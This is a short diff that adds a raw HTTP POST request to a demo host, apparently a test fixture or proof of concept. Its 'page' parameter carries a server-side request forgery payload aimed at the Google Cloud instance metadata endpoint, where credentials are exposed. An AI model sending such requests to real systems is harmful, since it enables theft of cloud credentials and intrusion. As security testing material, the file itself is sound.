@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Connection: close
+
+page=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F
